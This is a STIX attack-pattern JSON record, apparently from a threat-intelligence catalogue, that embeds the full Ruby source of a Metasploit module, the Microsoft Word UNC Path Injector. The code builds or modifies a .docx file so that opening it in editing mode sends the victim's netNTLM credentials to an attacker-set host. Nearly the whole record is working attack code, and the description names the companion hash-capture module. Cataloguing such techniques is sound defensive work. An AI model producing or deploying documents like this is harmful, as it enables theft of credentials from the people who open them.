{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--17e27a2d-9f28-4bb4-9632-9896d7821ee6",
    "created": "2024-08-14T16:32:57.985093Z",
    "modified": "2024-08-14T16:32:57.985098Z",
    "name": "Microsoft Word UNC Path Injector",
    "description": " This module modifies a .docx file that will, upon opening, submit stored netNTLM credentials to a remote host. It can also create an empty docx file. If emailed the receiver needs to put the document in editing mode before the remote server will be contacted. Preview and read-only mode do not work. Verified to work with Microsoft Word 2003, 2007, 2010, and 2013. In order to get the hashes the auxiliary/server/capture/smb module can be used.  'License'        => MSF_LICENSE 'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/docx/word_unc_injector.rb",
            "external_id": "word_unc_injector.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n#\n# Gems\n#\n\n# for extracting files\nrequire 'zip'\n\n#\n# Project\n#\n\n# for creating files\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft Word UNC Path Injector',\n      'Description'    => %q{\n          This module modifies a .docx file that will, upon opening, submit stored\n        netNTLM credentials to a remote host. It can also create an empty docx file. If\n        emailed the receiver needs to put the document in editing mode before the remote\n        server will be contacted. Preview and read-only mode do not work. Verified to work\n        with Microsoft Word 2003, 2007, 2010, and 2013. In order to get the hashes the\n        auxiliary/server/capture/smb module can be used.\n      },\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'https://web.archive.org/web/20140527232608/http://jedicorp.com/?p=534' ]\n        ],\n      'Author'         =>\n        [\n          'SphaZ <cyberphaz[at]gmail.com>'\n        ]\n    ))\n\n    register_options(\n      [\n        OptAddressLocal.new('LHOST',[true, 'Server IP or hostname that the .docx document points to.']),\n        OptPath.new('SOURCE', [false, 'Full path and filename of .docx file to use as source. If empty, creates new document.']),\n        OptString.new('FILENAME', [true, 'Document output filename.', 'msf.docx']),\n        OptString.new('DOCAUTHOR',[false,'Document author for empty document.']),\n      ])\n  end\n\n  # here we create an empty .docx file with the UNC path. Only done when FILENAME is empty\n  def make_new_file\n    metadata_file_data = \"\"\n    metadata_file_data << \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\" standalone=\\\"yes\\\"?><cp:coreProperties\"\n    metadata_file_data << \" xmlns:cp=\\\"http://schemas.openxmlformats.org/package/2006/metadata/core-properties\\\" \"\n    metadata_file_data << \"xmlns:dc=\\\"http://purl.org/dc/elements/1.1/\\\" xmlns:dcterms=\\\"http://purl.org/dc/terms/\\\" \"\n    metadata_file_data << \"xmlns:dcmitype=\\\"http://purl.org/dc/dcmitype/\\\" xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\">\"\n    metadata_file_data << \"<dc:creator>#{datastore['DOCAUTHOR']}</dc:creator><cp:lastModifiedBy>#{datastore['DOCAUTHOR']}\"\n    metadata_file_data << \"</cp:lastModifiedBy><cp:revision>1</cp:revision><dcterms:created xsi:type=\\\"dcterms:W3CDTF\\\">\"\n    metadata_file_data << \"2013-01-08T14:14:00Z</dcterms:created><dcterms:modified xsi:type=\\\"dcterms:W3CDTF\\\">\"\n    metadata_file_data << \"2013-01-08T14:14:00Z</dcterms:modified></cp:coreProperties>\"\n\n    # where to find the skeleton files required for creating an empty document\n    data_dir = File.join(Msf::Config.data_directory, \"exploits\", \"docx\")\n\n    zip_data = {}\n\n    # add skeleton files\n    vprint_status(\"Adding skeleton files from #{data_dir}\")\n    Dir[\"#{data_dir}/**/**\"].each do |file|\n      if not File.directory?(file)\n        zip_data[file.sub(data_dir,'')] = File.read(file, mode: 'rb')\n      end\n    end\n\n    # add on-the-fly created documents\n    vprint_status(\"Adding injected files\")\n    zip_data[\"docProps/core.xml\"] = metadata_file_data\n    zip_data[\"word/_rels/settings.xml.rels\"] = @rels_file_data\n\n    # add the otherwise skipped \"hidden\" file\n    file = \"#{data_dir}/_rels/.rels\"\n    zip_data[file.sub(data_dir,'')] = File.read(file, mode: 'rb')\n    # and lets create the file\n    zip_docx(zip_data)\n  end\n\n  # here we inject an UNC path into an existing file, and store the injected file in FILENAME\n  def manipulate_file\n    ref = \"<w:attachedTemplate r:id=\\\"rId1\\\"/>\"\n\n    if not File.stat(datastore['SOURCE']).readable?\n      print_error(\"Not enough rights to read the file. Aborting.\")\n      return nil\n    end\n\n    # lets extract our docx and store it in memory\n    zip_data = unzip_docx\n\n    # file to check for reference file we need\n    file_content = zip_data[\"word/settings.xml\"]\n    if file_content.nil?\n      print_error(\"Bad \\\"word/settings.xml\\\" file, check if it is a valid .docx.\")\n      return nil\n    end\n\n    # if we can find the reference to our inject file, we don't need to add it and can just inject our unc path.\n    if not file_content.index(\"w:attachedTemplate r:id=\\\"rId1\\\"\").nil?\n      vprint_status(\"Reference to rels file already exists in settings file, we dont need to add it :)\")\n      zip_data[\"word/_rels/settings.xml.rels\"] = @rels_file_data\n      # lets zip the end result\n      zip_docx(zip_data)\n    else\n      # now insert the reference to the file that will enable our malicious entry\n      insert_one = file_content.index(\"<w:defaultTabStop\")\n\n      if insert_one.nil?\n        insert_two = file_content.index(\"<w:hyphenationZone\") # 2nd choice\n        if not insert_two.nil?\n          vprint_status(\"HypenationZone found, we use this for insertion.\")\n          file_content.insert(insert_two, ref )\n        end\n      else\n        vprint_status(\"DefaultTabStop found, we use this for insertion.\")\n        file_content.insert(insert_one, ref )\n      end\n\n      if insert_one.nil? && insert_two.nil?\n        print_error(\"Cannot find insert point for reference into settings.xml\")\n        return nil\n      end\n\n      # update the files that contain the injection and reference\n      zip_data[\"word/settings.xml\"] = file_content\n      zip_data[\"word/_rels/settings.xml.rels\"] = @rels_file_data\n      # lets zip the file\n      zip_docx(zip_data)\n    end\n    return 0\n  end\n\n  # making the actual docx from the hash\n  def zip_docx(zip_data)\n    docx = Rex::Zip::Archive.new\n    zip_data.each_pair do |k,v|\n      docx.add_file(k,v)\n    end\n    file_create(docx.pack)\n  end\n\n  # unzip the .docx document. sadly Rex::zip does not uncompress so we do it the Rubyzip way\n  def unzip_docx\n    # Ruby sometimes corrupts the document when manipulating inside a compressed document, so we extract it with Zip::File\n    vprint_status(\"Extracting #{datastore['SOURCE']} into memory.\")\n    # we read it all into memory\n    zip_data = Hash.new\n    begin\n      Zip::File.open(datastore['SOURCE'])  do |filezip|\n        filezip.each do |entry|\n          zip_data[entry.name] = filezip.read(entry)\n        end\n      end\n    rescue Zip::Error => e\n      print_error(\"Error extracting #{datastore['SOURCE']} please verify it is a valid .docx document.\")\n      return nil\n    end\n    return zip_data\n  end\n\n\n  def run\n    # we need this in make_new_file and manipulate_file\n    @rels_file_data = \"\"\n    @rels_file_data << \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\" standalone=\\\"yes\\\"?>\".chomp\n    @rels_file_data << \"<Relationships xmlns=\\\"http://schemas.openxmlformats.org/package/2006/relationships\\\">\".chomp\n    @rels_file_data << \"<Relationship Id=\\\"rId1\\\" Type=\\\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/\".chomp\n    @rels_file_data << \"attachedTemplate\\\" Target=\\\"file://\\\\\\\\#{datastore['LHOST']}\\\\normal.dot\\\" TargetMode=\\\"External\\\"/></Relationships>\"\n\n    if \"#{datastore['SOURCE']}\" == \"\"\n      # make an empty file\n      print_status(\"Creating empty document that points to #{datastore['LHOST']}.\")\n      make_new_file\n    else\n      # extract the word/settings.xml and edit in the reference we need\n      print_status(\"Injecting UNC path into existing document.\")\n      if manipulate_file.nil?\n        print_error(\"Failed to create a document from #{datastore['SOURCE']}.\")\n      else\n        print_good(\"Copy of #{datastore['SOURCE']} called #{datastore['FILENAME']} points to #{datastore['LHOST']}.\")\n      end\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}